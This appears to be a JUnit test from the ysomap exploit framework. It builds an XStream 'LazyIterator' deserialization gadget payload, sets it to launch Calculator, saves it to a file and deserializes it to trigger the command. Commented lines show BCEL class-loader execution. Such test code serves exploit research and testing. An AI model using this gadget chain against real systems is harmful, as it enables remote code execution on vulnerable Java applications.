package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.serializer.Serializer;

import java.io.FileOutputStream;
import java.io.OutputStream;

/**
 * @author wh1t3P1g
 * @since 2020/4/17
 */
public class LazyIteratorTest {

    @Test
    public void pack() throws Exception {
        Payload payload = new LazyIterator();
        Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
        payload.setBullet(bullet);
        Serializer serializer = payload.getSerializer();
        Object obj = payload.getObject();
        Object serialized = serializer.serialize(obj);
        System.out.println(serialized);
        OutputStream out = new FileOutputStream("obj1.ser");
        serializer.serialize(obj, out);
//        serializer.serialize(obj, System.out);
        serializer.deserialize(serialized);
//        String bcel = PayloadHelper.makeBCELStr((byte[]) bullet.getObject());
//        Object classLoader = PayloadHelper.makeBCELClassLoader();
//        Class cl = Class.forName(bcel, true, (ClassLoader) classLoader);
//        cl.newInstance();
    }
}